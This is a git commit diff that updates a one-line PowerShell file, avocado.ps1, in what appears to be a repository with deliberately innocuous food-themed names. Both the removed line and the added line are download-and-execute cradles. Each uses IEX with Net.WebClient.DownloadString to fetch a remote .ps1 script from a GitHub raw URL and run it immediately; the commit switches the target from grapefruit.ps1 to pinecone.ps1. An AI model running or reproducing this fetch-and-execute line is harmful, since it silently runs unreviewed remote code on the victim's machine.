752c49ae1434492cd84c6b41b8ebf0c399fefac9
billhemmer2789 <97331850+billhemmer2789@users.noreply.github.com>
2022-01-09 11:49:46 -0600

    Update avocado.ps1

--- avocado.ps1
+++ avocado.ps1
@@ -1,1 +1,1 @@
-IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/billhemmer2789/food/main/grapefruit.ps1");
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/billhemmer2789/food/main/pinecone.ps1");
